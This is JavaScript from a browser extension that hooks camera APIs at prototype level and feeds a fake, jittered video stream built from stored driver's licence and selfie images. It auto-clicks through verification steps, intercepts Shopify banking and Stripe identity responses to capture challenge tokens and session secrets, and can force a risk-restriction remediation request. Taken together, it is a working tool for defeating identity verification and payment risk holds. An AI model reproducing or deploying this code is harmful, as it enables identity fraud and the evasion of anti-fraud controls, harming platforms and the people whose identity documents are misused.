// MAIN world — runs at document_start BEFORE any page JS
// Aggressively overrides camera APIs at prototype level

;(function IDVPatcher() {

// Safe sessionStorage wrappers — sandboxed iframes throw SecurityError
function ssGet(k)    { try { return sessionStorage.getItem(k) }  catch(_) { return null } }
function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }

// IMAGE STORE — sync from sessionStorage + async via postMessage
const IDV = {
  dlFront: ssGet('__idv_dl_front__'),
  dlBack:  ssGet('__idv_dl_back__'),
  selfies: [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
  phase:   ssGet('__idv_phase__') || 'id',
  idStep:  0,
  cameraActive: false
}

window.addEventListener('message', ev => {
  if (ev.source !== window || ev.data?._idv !== 'IDV_SET') return
  const d = ev.data
  if (d.dlFront)        IDV.dlFront  = d.dlFront
  if (d.dlBack)         IDV.dlBack   = d.dlBack
  if (d.selfies?.length) IDV.selfies = d.selfies
  if (d.phase)          IDV.phase    = d.phase
  console.log('[IDV] ✓ Images loaded. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
  updateBadge()
})

function pickSrc() {
  if (IDV.phase === 'selfie') return IDV.selfies[0] || IDV.dlFront
  return IDV.idStep === 1 ? (IDV.dlBack || IDV.dlFront) : IDV.dlFront
}

// ─────────────────────────────────────────────────────────────────────────────
// VISUAL BADGE — shows if fake camera is ready
// ─────────────────────────────────────────────────────────────────────────────
let badge = null
function createBadge() {
  if (badge || !document.body) return
  badge = document.createElement('div')
  badge.id = '__idv_badge__'
  badge.style.cssText = [
    'position:fixed','bottom:12px','right:12px','z-index:2147483647',
    'padding:5px 10px','border-radius:20px','font-size:11px','font-family:monospace',
    'font-weight:700','pointer-events:none','transition:all 0.3s',
    'box-shadow:0 2px 8px rgba(0,0,0,0.4)'
  ].join(';')
  document.body.appendChild(badge)
  updateBadge()
}
function updateBadge() {
  if (!badge) return
  const hasImg = !!IDV.dlFront
  const active = IDV.cameraActive
  if (active) {
    badge.textContent = '⬡ IDV CAM ACTIVE'
    badge.style.background = '#052005'
    badge.style.color = '#4ade80'
    badge.style.border = '1px solid #14532d'
  } else if (hasImg) {
    badge.textContent = '⬡ IDV READY'
    badge.style.background = '#030d2d'
    badge.style.color = '#60a5fa'
    badge.style.border = '1px solid #1d4ed8'
  } else {
    badge.textContent = '⬡ IDV NO IMAGE'
    badge.style.background = '#1a0505'
    badge.style.color = '#f87171'
    badge.style.border = '1px solid #7f1d1d'
  }
}
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', createBadge)
} else {
  createBadge()
}

// ─────────────────────────────────────────────────────────────────────────────
// BUILD FAKE STREAM
// ─────────────────────────────────────────────────────────────────────────────
async function loadImg(src) {
  return new Promise(resolve => {
    const i = new Image()
    i.onload  = () => resolve(i)
    i.onerror = () => { console.log('[IDV] ✗ Image load error'); resolve(null) }
    setTimeout(() => resolve(null), 6000)
    i.src = src
  })
}

async function buildFakeStream(src) {
  console.log('[IDV] Building fake stream, src length=' + src?.length)
  const img = await loadImg(src)
  if (!img) { console.log('[IDV] ✗ Could not load image'); return null }
  console.log('[IDV] ✓ Image loaded:', img.naturalWidth + 'x' + img.naturalHeight)

  const W = 1280, H = 720
  const canvas = document.createElement('canvas')
  canvas.width = W; canvas.height = H
  const ctx = canvas.getContext('2d', { willReadFrequently: false })

  const scaleBase = Math.min(W / img.naturalWidth, H / img.naturalHeight) * 0.86
  let ox = 0, oy = 0, sc = 1.0
  let vx = 0.18, vy = 0.12, vs = 0.00012

  function frame() {
    ox += vx; oy += vy; sc += vs
    if (Math.abs(ox) > 9)  vx *= -1
    if (Math.abs(oy) > 6)  vy *= -1
    if (sc > 1.02 || sc < 0.98) vs *= -1

    const s  = scaleBase * sc
    const iw = img.naturalWidth * s
    const ih = img.naturalHeight * s
    const x  = (W - iw) / 2 + ox
    const y  = (H - ih) / 2 + oy

    ctx.fillStyle = '#111'
    ctx.fillRect(0, 0, W, H)
    ctx.drawImage(img, x, y, iw, ih)

    // Vignette
    const vg = ctx.createRadialGradient(W/2, H/2, H*.33, W/2, H/2, H*.72)
    vg.addColorStop(0, 'rgba(0,0,0,0)')
    vg.addColorStop(1, 'rgba(0,0,0,0.22)')
    ctx.fillStyle = vg
    ctx.fillRect(0, 0, W, H)
  }
  frame()

  let stream = null
  let stopFn  = () => {}

  // Try MediaStreamTrackGenerator (Chrome 94+)
  if (typeof MediaStreamTrackGenerator !== 'undefined') {
    try {
      const gen = new MediaStreamTrackGenerator({ kind: 'video' })
      const writer = gen.writable.getWriter()
      let alive = true
      async function pump(ts) {
        if (!alive) return
        frame()
        const vf = new VideoFrame(canvas, { timestamp: Math.floor(ts * 1000), duration: 33333 })
        try { await writer.write(vf) } catch(_) {}
        vf.close()
        requestAnimationFrame(pump)
      }
      requestAnimationFrame(pump)
      stream = new MediaStream([gen])
      stopFn = () => { alive = false; try { writer.close() } catch(_) {} }
      console.log('[IDV] ✓ Using MediaStreamTrackGenerator')
    } catch(e) {
      console.log('[IDV] TrackGenerator error:', e.message)
      stream = null
    }
  }

  // Fallback: canvas.captureStream
  if (!stream) {
    const iv = setInterval(frame, 33)
    stream = canvas.captureStream(30)
    stopFn = () => clearInterval(iv)
    console.log('[IDV] ✓ Using canvas.captureStream')
  }

  // Spoof track metadata
  const track = stream.getVideoTracks()[0]
  if (track) {
    track.getSettings     = () => ({ width: W, height: H, frameRate: 30, facingMode: IDV.phase === 'selfie' ? 'user' : 'environment', deviceId: 'idv-cam', groupId: 'idv-grp' })
    track.getCapabilities = () => ({ width: { min:1, max:1920 }, height: { min:1, max:1080 }, frameRate: { min:1, max:60 }, facingMode: ['user','environment'] })
    track.getConstraints  = () => ({})
    const origStop = track.stop.bind(track)
    track.stop = () => { stopFn(); origStop(); IDV.cameraActive = false; updateBadge() }
  }

  IDV.cameraActive = true
  updateBadge()
  return stream
}

// ─────────────────────────────────────────────────────────────────────────────
// OVERRIDE getUserMedia — PROTOTYPE LEVEL (most aggressive)
// ─────────────────────────────────────────────────────────────────────────────
if (typeof MediaDevices !== 'undefined') {
  const _origProtoGUM = MediaDevices.prototype.getUserMedia

  const fakeGUM = async function fakeGetUserMedia(constraints) {
    console.log('[IDV] getUserMedia intercepted, video=' + !!constraints?.video)
    if (!constraints?.video) return _origProtoGUM.call(this, constraints)

    // Wait up to 8s for images
    for (let i = 0; i < 40; i++) {
      if (IDV.dlFront) break
      const ss = ssGet('__idv_dl_front__')
      if (ss) { IDV.dlFront = ss; break }
      await new Promise(r => setTimeout(r, 200))
    }

    const src = pickSrc()
    if (!src) {
      console.log('[IDV] ✗ No image stored — using real camera. Upload DL in side panel!')
      return _origProtoGUM.call(this, constraints)
    }

    const fake = await buildFakeStream(src)
    if (!fake) {
      console.log('[IDV] ✗ Stream build failed — real camera fallback')
      return _origProtoGUM.call(this, constraints)
    }

    console.log('[IDV] ✓ Returning FAKE stream!')
    return fake
  }

  // Replace on prototype — affects ALL MediaDevices instances
  // Use defineProperty so it can't be overwritten easily
  Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
    get() { return fakeGUM },
    set(v) { /* block overwrites */ },
    configurable: true
  })

  // Also override on the navigator.mediaDevices instance directly
  try {
    Object.defineProperty(navigator.mediaDevices, 'getUserMedia', {
      get() { return fakeGUM },
      set(v) {},
      configurable: true
    })
  } catch(_) {}

  // Legacy APIs (some older Shopify code might use these)
  try { navigator.getUserMedia      = (c,s,e) => fakeGUM.call(navigator.mediaDevices, c).then(s).catch(e) } catch(_) {}
  try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM.call(navigator.mediaDevices, c).then(s).catch(e) } catch(_) {}
  try { navigator.mozGetUserMedia    = (c,s,e) => fakeGUM.call(navigator.mediaDevices, c).then(s).catch(e) } catch(_) {}

  // Spoof enumerateDevices
  const _origEnum = MediaDevices.prototype.enumerateDevices
  MediaDevices.prototype.enumerateDevices = async function() {
    const real = await _origEnum.call(this).catch(() => [])
    if (!real.some(d => d.kind === 'videoinput')) {
      real.unshift({ deviceId: 'idv-cam', groupId: 'idv-grp', kind: 'videoinput', label: 'IDV Virtual Camera', toJSON() { return this } })
    }
    return real
  }

  // ImageCapture override
  if (typeof ImageCapture !== 'undefined') {
    const _OIC = ImageCapture
    window.ImageCapture = class IDVImageCapture {
      constructor(track) { this._track = track; this._real = new _OIC(track) }
      async grabFrame() {
        const src = pickSrc(); if (!src) return this._real.grabFrame()
        const img = await loadImg(src); if (!img) return this._real.grabFrame()
        return createImageBitmap(img)
      }
      async takePhoto(o) {
        const src = pickSrc(); if (!src) return this._real.takePhoto(o)
        const img = await loadImg(src); if (!img) return this._real.takePhoto(o)
        const c = document.createElement('canvas')
        c.width = img.naturalWidth; c.height = img.naturalHeight
        c.getContext('2d').drawImage(img, 0, 0)
        return new Promise(r => c.toBlob(r, 'image/jpeg', 0.95))
      }
      getPhotoCapabilities() { return this._real.getPhotoCapabilities() }
      getPhotoSettings()     { return this._real.getPhotoSettings() }
      get track()            { return this._track }
    }
  }

  console.log('[IDV] ✓ Camera prototype patched on', location.hostname)
  console.log('[IDV] dlFront ready:', !!IDV.dlFront)
}

// ─────────────────────────────────────────────────────────────────────────────
// AUTO-PHASE DETECTOR + AUTO-CLICK
// ─────────────────────────────────────────────────────────────────────────────
const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','face forward']
const BACK_W    = ['back of','flip your','other side','back side','reverse']
const ADVANCE_W = ['looks good','use this photo','use photo','confirm','captured','✓']
const CLICK_BTN = ['looks good','use this photo','use photo','confirm','continue','next','submit','done','got it']

let _lastText = ''
function onDOMChange() {
  const text = document.body?.innerText?.toLowerCase() || ''
  if (text === _lastText) return
  _lastText = text

  if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => text.includes(w))) {
    IDV.idStep = 1
    console.log('[IDV] → Back of ID step')
  }
  if (IDV.phase !== 'selfie' && SELFIE_W.some(w => text.includes(w))) {
    IDV.phase = 'selfie'
    ssSet('__idv_phase__', 'selfie')
    window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
    console.log('[IDV] → Selfie phase')
  }
  if (ADVANCE_W.some(w => text.includes(w))) {
    setTimeout(doAutoClick, 900)
  }
}

function doAutoClick() {
  const btns = [...document.querySelectorAll('button,[role="button"]')]
    .filter(b => !b.disabled && b.offsetParent !== null)
  for (const phrase of CLICK_BTN) {
    const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
    if (b) { console.log('[IDV] Auto-click:', b.textContent.trim()); b.click(); return }
  }
}

function watchDOM() {
  if (!document.body) { document.addEventListener('DOMContentLoaded', watchDOM); return }
  new MutationObserver(onDOMChange).observe(document.body, { childList:true, subtree:true, characterData:true })
  onDOMChange()
}
watchDOM()

// ─────────────────────────────────────────────────────────────────────────────
// FETCH INTERCEPTOR
// ─────────────────────────────────────────────────────────────────────────────
const FPAT = ['banking_home_banking','payments/banking','shopify/graphql','verificationhub.shopify.com','verify.stripe.com']

function getStore() { return location.pathname.match(/\/store\/([^/?#]+)/)?.[1] ?? null }
function gid2id(g)  { return g ? (String(g).match(/\/(\d+)$/)?.[1] ?? String(g)) : null }

function parseCaptures(url, data) {
  const out = {}
  if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
    const ba = data.bankAccount || data?.data?.bankAccount
    if (ba?.id) { out.bank_account_id = gid2id(ba.id); out.bank_account_gid = ba.id }
    const restr = ba?.riskRestrictions || []
    const act = restr.find(r => r.status === 'ACTIVE')
    if (act) { out.active_restriction_id = gid2id(act.id); out.active_restriction_gid = act.id; out.active_restriction_status = 'ACTIVE' }
    const pr = data.principal || data?.data?.principal
    if (pr?.id) out.principal_id = gid2id(pr.id)
    out._e = 'banking_home'
  }
  if (url.includes('shopify/graphql') || url.includes('verificationhub')) {
    const d = data.data || {}
    const pgrr = d.payoutGateRemediate
    if (pgrr?.challengeToken) { out.jwt = pgrr.challengeToken; out.jwt_type = 'pgrr'; out._e = 'pgrr' }
    const rrr = d.remediateRiskRestriction
    if (rrr?.challengeToken) { out.jwt = rrr.challengeToken; out.jwt_type = 'remediate'; out._e = 'remediate' }
    for (const k of Object.keys(d)) {
      if (k.startsWith('createIVA') || k.startsWith('createIdentityVerification')) {
        const vs = d[k]?.verificationSession
        if (vs) { out.ek = vs.id; out.ek_client_secret = vs.clientSecret; out.assessment_ref = vs.referenceId; out.civa_variant = k; out._e = 'civa'; break }
      }
    }
    const ca = d.createAssessment
    if (ca?.assessmentReference) { out.vhub_assessment_ref = ca.assessmentReference; out._e = 'vhub' }
    const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
    if (bh?.riskRestrictions !== undefined) {
      const hasAct = bh.riskRestrictions.some(r => r.status === 'ACTIVE')
      out.discharge_detected = !hasAct
      out._e = hasAct ? 'poll_active' : 'discharge'
    }
  }
  if (url.includes('verify.stripe.com')) {
    const s = data.session || data
    if (s.status) { out.stripe_session_status = s.status; out._e = 'stripe_' + s.status }
  }
  return Object.keys(out).filter(k => !k.startsWith('_')).length > 0 ? out : null
}

function sendCapture(url, data) {
  const c = parseCaptures(url, data)
  if (c) window.postMessage({ _idv: 'CAPTURE', store: getStore(), url, captures: c, timestamp: Date.now() }, '*')
}

// Force verify
window.addEventListener('message', async ev => {
  if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
  const mut = `mutation RemediateIDV($id:ID!){remediateRiskRestriction(input:{riskRestrictionId:$id}){challengeToken userErrors{field message}}}`
  try {
    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
      method:'POST', credentials:'include',
      headers:{ 'Content-Type':'application/json', ...(csrf?{'X-CSRF-Token':csrf}:{}) },
      body: JSON.stringify({ operationName:'RemediateIDV', query:mut, variables:{ id:ev.data.riskRestrictionId } })
    })
    const data = await res.json()
    sendCapture('shopify/graphql', data)
    const rrr = data?.data?.remediateRiskRestriction
    if (rrr?.challengeToken) window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ ok:true } }, '*')
    else window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ ok:false, error: rrr?.userErrors?.map(e=>e.message).join(', ')||'error' } }, '*')
  } catch(e) {
    window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ ok:false, error:String(e) } }, '*')
  }
})

const _origFetch = window.fetch.bind(window)
window.fetch = async function(input, init) {
  const res = await _origFetch(input, init)
  const url = typeof input === 'string' ? input : input?.url || ''
  if (FPAT.some(p => url.includes(p))) res.clone().json().then(d => sendCapture(url, d)).catch(() => {})
  return res
}

})()
